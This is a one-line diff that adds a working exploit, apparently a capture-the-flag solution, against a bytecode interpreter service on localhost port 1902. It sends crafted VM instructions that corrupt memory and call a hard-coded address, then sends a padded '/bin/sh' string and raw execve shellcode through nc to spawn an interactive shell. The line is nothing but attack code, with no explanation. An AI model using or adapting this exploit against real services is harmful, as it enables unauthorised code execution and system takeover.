@@ -1,0 +1,1 @@
+(printf 'LOAD 0\nVECTOR\nLOAD 0\nLAMBDA 4096\nLOAD 1\nLOAD 1\nVECTOR\nLOAD 1\nLOAD 33562624\nVECTORSET\nLOAD 0\nADD\nLOAD NULL\nLOAD NULL\nLOAD NULL\nPRIMAPPLY 0x80087bf\nDONE\n'; sleep 1; python3 -c 'import os; os.write(1, b"/bin/sh".ljust(0x7c8, b"\x00") + b"\xb8\x3b\x00\x00\x00\xbf\x00\x80\x00\x08\x31\xf6\x31\xd2\x0f\x05")'; cat) | nc 127.0.0.1 1902
